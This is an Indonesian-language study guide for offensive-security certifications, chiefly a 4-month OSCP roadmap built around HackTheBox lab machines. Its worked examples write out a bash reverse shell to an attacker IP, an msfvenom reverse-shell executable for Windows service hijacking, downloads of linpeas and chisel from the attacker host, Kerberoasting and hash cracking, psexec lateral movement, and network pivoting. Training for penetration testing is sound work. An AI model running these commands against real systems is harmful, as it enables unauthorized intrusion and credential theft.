🎯 Mengapa Sertifikasi Penting?

Di industri offensive security, sertifikasi praktikal adalah bukti bahwa kamu bisa benar-benar compromise mesin, bukan hanya hafal teori. Recruiter sering menggunakan sertifikasi sebagai filter awal — tapi yang membuatmu diterima adalah portfolio + skill praktikal.

Prinsip Pixel Detective: Sertifikasi adalah validasi, bukan tujuan. Jangan kejar "kertas" — kejar kemampuan. Sertifikat akan mengikuti.

Peta Sertifikasi Offensive Security

eJPT (eLearnSecurity) Entry Praktikal (48 jam) ~$200 Setelah Fase 2 ⭐⭐⭐ (CV awal)
PNPT (TCM Security) Entry–Mid Praktikal (5 hari) + debrief ~$499 Setelah 10+ mesin HTB ⭐⭐⭐⭐ (alternatif OSCP)

🎯 3.1 Persiapan OSCP — Roadmap 4 Bulan

OSCP adalah target utama. Ini roadmap persiapan 4 bulan yang realistis — dengan target terukur per bulan.

📅 Bulan 1: Fondasi Mesin Linux

  1. Selesaikan 15 mesin Easy di HackTheBox (retired) — fokus Linux.
  2. Dokumentasi setiap mesin dengan template writeup: Recon → Enumeration → Exploitation → Privilege Escalation → Lessons Learned.
  3. Latih manual exploitation — jangan langsung Metasploit. Pahami setiap langkah.
  4. Kuasai Nmap advanced — -sC, -sV, -p-, --script, -oA.
  5. Kuasai Gobuster/ffuf — directory & subdomain enumeration.

💡 Contoh: Workflow Enumeration Mesin HTB (Linux)

# ── STEP 1: Nmap full scan ──
nmap -sC -sV -p- --min-rate 5000 -oA nmap/full 10.10.10.X

# ── STEP 2: Analisis hasil ──
# Contoh output:
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1
# 80/tcp   open  http    Apache httpd 2.4.41
# 8080/tcp open  http    Tomcat 9.0

# ── STEP 3: Web enumeration ──
ffuf -u http://10.10.10.X/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 -t 50

# ── STEP 4: Cek setiap endpoint yang ditemukan ──
curl -s http://10.10.10.X/admin/ | head -50
curl -s http://10.10.10.X/backup/ | head -50

# ── STEP 5: Jika ada login page, coba default creds ──
# admin:admin, admin:password, root:root

# ── STEP 6: Jika ada file upload, coba upload shell ──
# Buat payload: bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
# Upload → akses → reverse shell

# ── STEP 7: Setelah foothold, privesc enumeration ──
# Upload linpeas.sh
wget http://10.10.14.X/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out

# ── STEP 8: Analisis output linpeas ──
# Cari: SUID, sudo -l, cron job, writable file, kernel exploit

Penjelasan: Workflow ini adalah alur standar untuk setiap mesin HTB. Latih sampai menjadi refleks — di exam OSCP, waktu adalah segalanya.

🎯 Target Bulan 1: 15 mesin Easy selesai + 15 writeup terdokumentasi + nyaman dengan Nmap, ffuf, dan linpeas.

📅 Bulan 2: Windows & Privilege Escalation

  1. Selesaikan 10 mesin Windows Easy/Medium di HTB.
  2. Kuasai Windows privesc:
    • Misconfigured service (unquoted path, weak permission)
    • Token impersonation (SeImpersonate, SeAssignPrimaryToken)
    • AlwaysInstallElevated
    • Credential dumping (Mimikatz, SAM, LSASS)
  3. Kuasai Linux privesc:
    • SUID/SGID abuse (GTFOBins)
    • Cron job misconfiguration
    • Sudo misconfig (sudo -l)
    • Kernel exploit (Dirty Pipe, Dirty Cow)
    • Capability abuse (getcap -r /)
  4. Gunakan linpeas/winpeas — tapi pahami outputnya, jangan buta.

💡 Contoh: Windows Privilege Escalation — Unquoted Service Path

# ── STEP 1: Enumeration service ──
# Dari shell user biasa (misal: www-data / IIS AppPool)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"

# Contoh output mencurigakan:
# VulnerableService  C:\\Program Files\\Vulnerable Service\\service.exe

# ── STEP 2: Analisis ──
# Path tidak di-quote → Windows akan coba:
#   C:\\Program.exe
#   C:\\Program Files\\Vulnerable.exe
#   C:\\Program Files\\Vulnerable Service\\service.exe
# Jika kita bisa tulis di C:\\ atau C:\\Program Files\\, kita bisa hijack.

# ── STEP 3: Cek permission folder ──
icacls "C:\\Program Files\\Vulnerable Service"
# Jika user biasa punya Write/Full Control → exploitable

# ── STEP 4: Buat payload ──
# Generate reverse shell dengan msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f exe -o Vulnerable.exe

# ── STEP 5: Upload payload ke path yang bisa ditulis ──
# Misal: C:\\Program Files\\Vulnerable.exe

# ── STEP 6: Restart service ──
sc stop VulnerableService
sc start VulnerableService

# ── STEP 7: Terima reverse shell ──
nc -lvnp 4444
# Shell sebagai SYSTEM

# ── Penjelasan ──
# Windows mencari executable di setiap spasi pada path yang tidak di-quote.
# Jika folder parent writable, attacker bisa menaruh executable malicious
# dengan nama yang cocok → dieksekusi sebagai SYSTEM.

Penjelasan: Unquoted Service Path adalah salah satu privesc Windows paling umum di OSCP. Kuncinya: cari service dengan path berspasi & tanpa tanda kutip, lalu cek izin folder induknya.

🎯 Target Bulan 2: 10 mesin Windows selesai + paham 5+ teknik privesc Windows & Linux + bisa membaca output linpeas/winpeas dengan percaya diri.

📅 Bulan 3: Active Directory & Buffer Overflow

  1. Pelajari AD Basics:
    • Struktur: Domain, Forest, OU, Group, User, Computer, GPO
    • Protokol: LDAP, Kerberos, DNS, SMB, RPC
    • Serangan: Kerberoasting, AS-REP Roasting, ACL Abuse, Lateral Movement
  2. Selesaikan HTB Pro Lab Dante/Offshore (minimal 10 mesin).
  3. Latih Buffer Overflow (Windows x86) — masih muncul di OSCP. Alat: Immunity Debugger, mona.py, msfvenom.
  4. Latih Pivoting: SSH Tunnel, Chisel, Ligolo-ng, Proxychains.

💡 Contoh: Kerberoasting — Full Attack Chain

# ── STEP 1: Dapatkan foothold sebagai domain user biasa ──
# (misal: dari phishing, web exploit, atau mesin yang sudah dikompromi)
# Kita punya: DOMAIN.LOCAL\\user:password

# ── STEP 2: Enumerasi user dengan SPN ──
# Dari mesin Linux (attacker), gunakan Impacket
python3 GetUserSPNs.py -dc-ip 10.10.10.10 \
  DOMAIN.LOCAL/user:password \
  -request -outputfile kerberoast.txt

# Output contoh:
# ServicePrincipalName  Name      MemberOf          PasswordLastSet
# MSSQLSvc/db01:1433   svc_sql   Domain Users      2024-01-15
# HTTP/web01           svc_web   Domain Admins     2024-02-20

# ── STEP 3: Ekstrak hash dari file ──
cat kerberoast.txt
# $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc/db01:1433*$...

# ── STEP 4: Crack hash dengan Hashcat ──
hashcat -m 13100 kerberoast.txt \
  /usr/share/wordlists/rockyou.txt \
  --force

# Jika berhasil:
# $krb5tgs$23$*svc_sql$...:Summer2024!

# ── STEP 5: Gunakan credential untuk Lateral Movement ──
crackmapexec smb 10.10.10.0/24 \
  -u svc_sql -p 'Summer2024!' --shares

# ── STEP 6: Jika punya akses admin ──
psexec.py DOMAIN.LOCAL/svc_sql:'Summer2024!'@10.10.10.20

# ── STEP 7: Ulangi enumerasi → cari Domain Admin ──
# Cek siapa yang login, cari credential di memory (Mimikatz)

# ── Penjelasan ──
# Kerberoasting = minta TGS ticket → crack offline → akses service.
# Tidak meninggalkan log mencurigakan di Domain Controller.
# Mitigasi: password panjang (25+ karakter) atau gMSA.

Penjelasan: Kerberoasting adalah serangan AD paling umum di OSCP. Kuncinya: akun service seringkali memiliki password lemah dan hak akses tinggi. Proses cracking dilakukan secara offline = tidak terdeteksi.

💡 Contoh: Pivoting dengan Chisel

# ── Skenario ──
# Mesin A: 10.10.10.5 (sudah dikompromi, punya akses ke 172.16.0.0/24)
# Mesin B: 172.16.0.10 — hanya bisa diakses dari Mesin A
# Tujuan: scan & eksploit Mesin B dari mesin attacker

# ── STEP 1: Siapkan Chisel Server di Attacker ──
chisel server -p 8000 --reverse

# ── STEP 2: Upload & jalankan Chisel Client di Mesin A ──
wget http://10.10.14.X/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.X:8000 R:socks

# ── STEP 3: Konfigurasi Proxychains ──
# Tambahkan di /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# ── STEP 4: Akses jaringan melalui pivot ──
proxychains nmap -sT -Pn -p 22,80,445 172.16.0.10
proxychains curl http://172.16.0.10/

# ── Alternatif: Ligolo-ng ──
# Lebih cepat & stabil untuk lalu lintas tinggi

Penjelasan: Pivoting = menembus jaringan yang tidak langsung terjangkau. Chisel & Ligolo-ng adalah alat paling populer. Latih sampai bisa setup dalam < 5 menit.

🎯 Target Bulan 3: Selesaikan HTB Pro Lab Dante/Offshore (10+ mesin) + paham alur serangan AD lengkap + bisa melakukan pivoting dengan Chisel/Ligolo-ng.

📅 Bulan 4: Simulasi Exam & Penulisan Laporan

  1. Kerjakan 3–5 mesin Medium/Hard di HTB — selesaikan dalam 4 jam per mesin.
  2. Simulasi ujian 24 jam: 5 mesin (2 Easy, 2 Medium, 1 Hard), tanpa akses internet (kecuali dokumentasi).
  3. Latih penulisan laporan — OSCP menilai dokumentasi, bukan hanya flag.

📚 3.3 Strategi Belajar Efektif

Metode "Pixel by Pixel"

  1. Fokus satu teknik per sesi — jangan campur 5 teknik dalam 1 jam.
  2. Dokumentasi sambil belajar — tulis writeup selama mengerjakan, bukan setelahnya.
  3. Review mingguan — baca ulang writeup, cari pola, identifikasi kelemahan.
  4. Ajarkan ke orang lain — blog post, thread Twitter, atau diskusi komunitas. Mengajar adalah cara belajar terbaik.
  5. Konsistensi > intensitas — 2 jam/hari konsisten lebih efektif daripada 10 jam sekali seminggu.

Jadwal Harian yang Realistis

Waktu Aktivitas Durasi
Pagi (30 menit) Baca writeup/CVE baru 30 menit
Siang (1 jam) Latihan mesin HTB/THM 60 menit
Malam (30 menit) Dokumentasi writeup 30 menit
Weekend (4 jam) Mesin Medium/Hard + review 4 jam
Total: ~2 jam/hari + 4 jam weekend = 18 jam/minggu. Dalam 4 bulan = ~288 jam. Cukup untuk persiapan OSCP yang serius.
